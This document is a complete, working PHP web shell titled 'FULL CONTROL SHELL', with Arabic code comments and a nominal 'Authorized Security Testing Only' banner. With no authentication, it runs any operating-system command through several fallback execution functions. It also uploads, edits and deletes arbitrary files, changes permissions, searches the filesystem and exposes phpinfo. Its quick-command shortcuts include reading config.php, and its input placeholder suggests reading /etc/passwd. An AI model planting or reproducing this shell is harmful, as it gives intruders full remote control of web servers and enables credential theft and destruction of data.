<?php
// ======================================================
// ADVANCED WEB SHELL - FULL CONTROL VERSION
// Authorized Security Testing Only
// ======================================================

error_reporting(E_ALL);
ini_set('display_errors', 1);

// ========== حل المشكلة 1: تنفيذ أي أمر مهما كان ==========
function execute_command($cmd) {
    $output = '';
    
    // محاولة جميع الطرق الممكنة لتنفيذ الأوامر
    if(function_exists('system')) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
    } 
    elseif(function_exists('exec')) {
        exec($cmd . " 2>&1", $output_array);
        $output = implode("\n", $output_array);
    }
    elseif(function_exists('shell_exec')) {
        $output = shell_exec($cmd . " 2>&1");
    }
    elseif(function_exists('passthru')) {
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_clean();
    }
    elseif(function_exists('popen')) {
        $handle = popen($cmd . " 2>&1", 'r');
        $output = stream_get_contents($handle);
        pclose($handle);
    }
    elseif(function_exists('proc_open')) {
        $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if(is_resource($process)) {
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
        }
    }
    else {
        $output = "[-] No command execution function available! Try: phpinfo()";
    }
    
    return $output ?: "[-] No output from command (or command failed)";
}

// ========== حل المشكلة 2 و 3: رفع الملفات بشكل صحيح ==========
$upload_message = '';
$uploaded_files = [];

if(isset($_FILES['upload_file'])) {
    $target_dir = isset($_POST['upload_dir']) ? $_POST['upload_dir'] : getcwd();
    
    // التأكد من وجود المجلد
    if(!is_dir($target_dir)) {
        mkdir($target_dir, 0777, true);
    }
    
    $file_name = basename($_FILES['upload_file']['name']);
    $target_file = $target_dir . '/' . $file_name;
    
    // محاولة رفع الملف
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
        $upload_message = "✅ Uploaded successfully: " . htmlspecialchars($file_name) . " → " . htmlspecialchars($target_file);
        // تغيير الصلاحيات
        chmod($target_file, 0644);
    } else {
        $upload_message = "❌ Upload failed! Check permissions: " . htmlspecialchars($target_dir);
        // عرض معلومات إضافية للمساعدة في التشخيص
        $upload_message .= "<br>📁 Directory writable: " . (is_writable($target_dir) ? 'Yes' : 'No');
        $upload_message .= "<br>📁 Directory exists: " . (is_dir($target_dir) ? 'Yes' : 'No');
    }
}

// ========== إدارة المجلد الحالي ==========
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if(!is_dir($current_dir)) {
    $current_dir = getcwd();
}
chdir($current_dir);

// ========== تنفيذ الأوامر ==========
$cmd_output = '';
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : (isset($_GET['cmd']) ? $_GET['cmd'] : '');
if($cmd) {
    $cmd_output = execute_command($cmd);
}

// ========== عمليات الملفات ==========
$message = '';

// حذف ملف
if(isset($_GET['delete']) && !empty($_GET['delete'])) {
    if(unlink($_GET['delete'])) {
        $message = "✅ Deleted: " . htmlspecialchars($_GET['delete']);
    } else {
        $message = "❌ Cannot delete: " . htmlspecialchars($_GET['delete']);
    }
}

// حذف مجلد
if(isset($_GET['delete_dir']) && !empty($_GET['delete_dir'])) {
    if(rmdir($_GET['delete_dir'])) {
        $message = "✅ Deleted folder: " . htmlspecialchars($_GET['delete_dir']);
    } else {
        $message = "❌ Cannot delete folder (must be empty): " . htmlspecialchars($_GET['delete_dir']);
    }
}

// تحرير ملف
if(isset($_POST['edit_file']) && isset($_POST['content'])) {
    if(file_put_contents($_POST['edit_file'], $_POST['content'])) {
        $message = "✅ Saved: " . htmlspecialchars($_POST['edit_file']);
    } else {
        $message = "❌ Cannot save: " . htmlspecialchars($_POST['edit_file']);
    }
}

// إنشاء ملف جديد
if(isset($_POST['new_file']) && isset($_POST['new_filename'])) {
    $new_path = $current_dir . '/' . $_POST['new_filename'];
    if(!file_exists($new_path)) {
        file_put_contents($new_path, $_POST['new_content'] ?? '');
        $message = "✅ Created file: " . htmlspecialchars($_POST['new_filename']);
    } else {
        $message = "❌ File already exists: " . htmlspecialchars($_POST['new_filename']);
    }
}

// إنشاء مجلد جديد
if(isset($_POST['new_dir']) && isset($_POST['new_dirname'])) {
    $new_dir_path = $current_dir . '/' . $_POST['new_dirname'];
    if(!is_dir($new_dir_path)) {
        mkdir($new_dir_path, 0777, true);
        $message = "✅ Created folder: " . htmlspecialchars($_POST['new_dirname']);
    } else {
        $message = "❌ Folder already exists: " . htmlspecialchars($_POST['new_dirname']);
    }
}

// تغيير الصلاحيات (chmod)
if(isset($_POST['chmod_file']) && isset($_POST['chmod_value'])) {
    $perms = octdec($_POST['chmod_value']);
    if(chmod($_POST['chmod_file'], $perms)) {
        $message = "✅ Changed permissions: " . htmlspecialchars($_POST['chmod_file']) . " to " . $_POST['chmod_value'];
    } else {
        $message = "❌ Cannot change permissions: " . htmlspecialchars($_POST['chmod_file']);
    }
}

// البحث عن ملفات
$search_results = [];
if(isset($_GET['search']) && !empty($_GET['search'])) {
    $search_term = $_GET['search'];
    $search_dir = isset($_GET['search_dir']) ? $_GET['search_dir'] : $current_dir;
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($search_dir));
    foreach($iterator as $file) {
        if($file->isFile() && strpos($file->getFilename(), $search_term) !== false) {
            $search_results[] = $file->getPathname();
            if(count($search_results) > 100) break;
        }
    }
}

// عرض معلومات PHP
$php_info = '';
if(isset($_GET['phpinfo'])) {
    ob_start();
    phpinfo();
    $php_info = ob_get_clean();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>⚡ FULL CONTROL SHELL ⚡</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            font-family: 'Segoe UI', 'Courier New', monospace;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1600px; margin: 0 auto; }
        
        /* Header */
        .header {
            background: linear-gradient(135deg, #16213e, #0f0f1a);
            border-radius: 20px;
            padding: 20px 30px;
            margin-bottom: 25px;
            border: 1px solid #00ffcc33;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .header h1 {
            font-size: 32px;
            background: linear-gradient(90deg, #ff3366, #00ffcc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        /* Grid */
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .card {
            background: #0f0f1ae6;
            backdrop-filter: blur(5px);
            border-radius: 16px;
            border: 1px solid #2a3a5a;
            overflow: hidden;
        }
        .card-header {
            background: #1a1a2e;
            padding: 12px 20px;
            font-weight: bold;
            border-bottom: 1px solid #00ffcc33;
            font-size: 16px;
        }
        .card-body { padding: 20px; }
        
        /* Terminal */
        .terminal {
            background: #050508;
            border-radius: 12px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            border: 1px solid #00ffcc33;
            max-height: 400px;
            overflow: auto;
            white-space: pre-wrap;
            color: #00ffaa;
        }
        
        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        .file-table th {
            text-align: left;
            padding: 8px;
            background: #1a1a2e;
            color: #00ffcc;
            border-bottom: 1px solid #00ffcc33;
        }
        .file-table td {
            padding: 6px 8px;
            border-bottom: 1px solid #2a2a3a;
        }
        .file-table tr:hover { background: #1a1a2e; }
        .dir-link { color: #66ffcc; text-decoration: none; font-weight: bold; }
        .file-link { color: #ffaa66; text-decoration: none; }
        .delete-link { color: #ff6666; margin-left: 10px; text-decoration: none; font-size: 11px; }
        
        /* Forms */
        input, select, textarea {
            background: #0a0a12;
            border: 1px solid #2a4a6a;
            color: #e0e0e0;
            padding: 8px 12px;
            border-radius: 8px;
        }
        button, .btn {
            background: linear-gradient(90deg, #0066ff, #00ccaa);
            border: none;
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
        }
        button:hover { opacity: 0.9; transform: scale(1.02); }
        
        .info-bar {
            background: #0a0a12;
            border-radius: 10px;
            padding: 10px 15px;
            margin-bottom: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            font-size: 12px;
        }
        .quick-cmd {
            background: #1a1a2e;
            padding: 4px 10px;
            border-radius: 15px;
            cursor: pointer;
            transition: 0.2s;
        }
        .quick-cmd:hover { background: #00ffcc33; }
        
        @media (max-width: 1000px) {
            .grid-2 { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
<div class="container">
    
    <div class="header">
        <h1>⚡ FULL CONTROL SHELL ⚡</h1>
        <div style="font-size: 12px;">Authorized Security Testing Only | <?= date('Y-m-d H:i:s') ?></div>
    </div>
    
    <div class="info-bar">
        <span>📁 PWD: <?= htmlspecialchars($current_dir) ?></span>
        <span>👤 USER: <?= execute_command('whoami 2>/dev/null') ?: get_current_user() ?></span>
        <span>🐘 PHP: <?= phpversion() ?></span>
        <span>💻 OS: <?= php_uname() ?></span>
        <span>🔓 Functions: <?= function_exists('system') ? 'system✓' : (function_exists('exec') ? 'exec✓' : 'none') ?></span>
    </div>
    
    <?php if($message): ?>
        <div style="background: #00aa6644; border: 1px solid #00ffaa; border-radius: 10px; padding: 10px; margin-bottom: 15px;"><?= $message ?></div>
    <?php endif; ?>
    
    <?php if($upload_message): ?>
        <div style="background: #ffaa3344; border: 1px solid #ffaa33; border-radius: 10px; padding: 10px; margin-bottom: 15px;"><?= $upload_message ?></div>
    <?php endif; ?>
    
    <div class="grid-2">
        <!-- Command Execution -->
        <div class="card">
            <div class="card-header">🖥️ COMMAND EXECUTION (Full Control)</div>
            <div class="card-body">
                <form method="POST">
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="cmd" placeholder="Any command: whoami, ls -la, id, cat /etc/passwd, python --version..." style="flex:1;" value="<?= htmlspecialchars($cmd) ?>">
                        <button type="submit">▶ RUN</button>
                    </div>
                </form>
                <div class="terminal" style="margin-top: 15px;">
                    <?= $cmd_output ? htmlspecialchars($cmd_output) : '> Enter any command above and click RUN' ?>
                </div>
                <div style="margin-top: 10px; font-size: 11px; display: flex; flex-wrap: wrap; gap: 8px;">
                    <span class="quick-cmd" onclick="document.querySelector('input[name=cmd]').value='whoami'">whoami</span>
                    <span class="quick-cmd" onclick="document.querySelector('input[name=cmd]').value='ls -la'">ls -la</span>
                    <span class="quick-cmd" onclick="document.querySelector('input[name=cmd]').value='pwd'">pwd</span>
                    <span class="quick-cmd" onclick="document.querySelector('input[name=cmd]').value='id'">id</span>
                    <span class="quick-cmd" onclick="document.querySelector('input[name=cmd]').value='php -v'">php -v</span>
                    <span class="quick-cmd" onclick="document.querySelector('input[name=cmd]').value='cat config.php'">cat config.php</span>
                    <span class="quick-cmd" onclick="document.querySelector('input[name=cmd]').value='find . -name \"*.php\" | head -20'">find php files</span>
                </div>
            </div>
        </div>
        
        <!-- File Upload (Fixed) -->
        <div class="card">
            <div class="card-header">📤 FILE UPLOAD (Fixed)</div>
            <div class="card-body">
                <form method="POST" enctype="multipart/form-data">
                    <input type="hidden" name="upload_dir" value="<?= htmlspecialchars($current_dir) ?>">
                    <div style="border: 2px dashed #2a4a6a; border-radius: 12px; padding: 20px; text-align: center;">
                        <input type="file" name="upload_file" style="margin-bottom: 10px;">
                        <button type="submit">⬆ UPLOAD HERE</button>
                        <div style="font-size: 11px; color: #888; margin-top: 10px;">
                            Uploads to: <strong><?= htmlspecialchars($current_dir) ?></strong><br>
                            <?php if(!is_writable($current_dir)): ?>
                                <span style="color: #ff6666;">⚠ Warning: Current directory is NOT writable!</span>
                            <?php else: ?>
                                <span style="color: #66ff66;">✓ Directory is writable</span>
                            <?php endif; ?>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <div class="grid-2">
        <!-- Create New File/Folder -->
        <div class="card">
            <div class="card-header">➕ CREATE NEW</div>
            <div class="card-body">
                <form method="POST" style="display: inline-block; margin-right: 20px;">
                    <input type="text" name="new_filename" placeholder="filename.php" style="width: 150px;">
                    <button type="submit" name="new_file" value="1">📄 Create File</button>
                </form>
                <form method="POST" style="display: inline-block;">
                    <input type="text" name="new_dirname" placeholder="folder_name" style="width: 150px;">
                    <button type="submit" name="new_dir" value="1">📁 Create Folder</button>
                </form>
            </div>
        </div>
        
        <!-- Search Files -->
        <div class="card">
            <div class="card-header">🔍 SEARCH FILES</div>
            <div class="card-body">
                <form method="GET">
                    <input type="text" name="search" placeholder="search term" style="width: 200px;">
                    <input type="hidden" name="search_dir" value="<?= htmlspecialchars($current_dir) ?>">
                    <button type="submit">🔎 Search</button>
                </form>
                <?php if($search_results): ?>
                    <div style="margin-top: 10px; font-size: 11px; max-height: 150px; overflow: auto;">
                        <?php foreach($search_results as $result): ?>
                            <a href="?dir=<?= urlencode(dirname($result)) ?>&edit=<?= urlencode($result) ?>" style="color: #ffaa66; display: block;">📄 <?= htmlspecialchars($result) ?></a>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    
    <!-- File Manager -->
    <div class="card" style="margin-top: 20px;">
        <div class="card-header">📂 FILE MANAGER</div>
        <div class="card-body">
            <div style="margin-bottom: 15px;">
                <a href="?dir=<?= urlencode($current_dir . '/..') ?>" class="btn" style="text-decoration:none; padding:5px 12px;">⬆ Parent Directory</a>
                <a href="?dir=<?= urlencode('/') ?>" class="btn" style="text-decoration:none; padding:5px 12px;">📁 / (Root)</a>
                <a href="?dir=<?= urlencode($_SERVER['DOCUMENT_ROOT'] ?? '/var/www') ?>" class="btn" style="text-decoration:none; padding:5px 12px;">🌐 Document Root</a>
                <span style="margin-left: 15px;">Current: <strong><?= htmlspecialchars($current_dir) ?></strong></span>
            </div>
            
            <table class="file-table">
                <thead>
                    <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
                </thead>
                <tbody>
                    <?php
                    $files = scandir($current_dir);
                    foreach($files as $file):
                        if($file == '.' || $file == '..') continue;
                        $full_path = $current_dir . '/' . $file;
                        $is_dir = is_dir($full_path);
                        $size = $is_dir ? '-' : number_format(filesize($full_path)) . ' B';
                        $perms = fileperms($full_path);
                        $perms_str = substr(sprintf('%o', $perms), -4);
                    ?>
                    <tr>
                        <td>
                            <?php if($is_dir): ?>
                                📁 <a href="?dir=<?= urlencode($full_path) ?>" class="dir-link"><?= htmlspecialchars($file) ?></a>
                            <?php else: ?>
                                📄 <a href="?edit=<?= urlencode($full_path) ?>&dir=<?= urlencode($current_dir) ?>" class="file-link"><?= htmlspecialchars($file) ?></a>
                            <?php endif; ?>
                        </td>
                        <td><?= $size ?></td>
                        <td><?= $perms_str ?></td>
                        <td>
                            <?php if($is_dir): ?>
                                <a href="?delete_dir=<?= urlencode($full_path) ?>&dir=<?= urlencode($current_dir) ?>" class="delete-link" onclick="return confirm('Delete empty folder?')">🗑 Delete</a>
                            <?php else: ?>
                                <a href="?delete=<?= urlencode($full_path) ?>&dir=<?= urlencode($current_dir) ?>" class="delete-link" onclick="return confirm('Delete file?')">🗑 Del</a>
                                <a href="?edit=<?= urlencode($full_path) ?>&dir=<?= urlencode($current_dir) ?>" class="delete-link" style="color:#66ffcc;">✏ Edit</a>
                                <form method="POST" style="display:inline;">
                                    <input type="hidden" name="chmod_file" value="<?= htmlspecialchars($full_path) ?>">
                                    <input type="text" name="chmod_value" size="4" placeholder="755" style="width:45px; padding:2px;">
                                    <button type="submit" style="padding:2px 5px; font-size:10px;">chmod</button>
                                </form>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
    
    <!-- File Editor -->
    <?php if(isset($_GET['edit']) && file_exists($_GET['edit'])): 
        $edit_file = $_GET['edit'];
        $file_content = file_get_contents($edit_file);
    ?>
    <div class="card" style="margin-top: 20px;">
        <div class="card-header">✏️ EDITING: <?= htmlspecialchars(basename($edit_file)) ?></div>
        <div class="card-body">
            <form method="POST">
                <input type="hidden" name="edit_file" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="content" style="width:100%; height:400px; background:#0a0a12; color:#00ffaa; border:1px solid #2a4a6a; font-family:monospace;"><?= htmlspecialchars($file_content) ?></textarea>
                <div style="margin-top: 15px;">
                    <button type="submit">💾 SAVE</button>
                    <a href="?dir=<?= urlencode(dirname($edit_file)) ?>" class="btn" style="background:#333; text-decoration:none;">⬅ Back</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- PHP Info -->
    <?php if($php_info): ?>
        <div class="card" style="margin-top: 20px;">
            <div class="card-header">🔧 PHP INFO</div>
            <div class="card-body">
                <div style="max-height: 500px; overflow: auto; font-size: 11px;"><?= $php_info ?></div>
            </div>
        </div>
    <?php endif; ?>
</div>
</body>
</html>
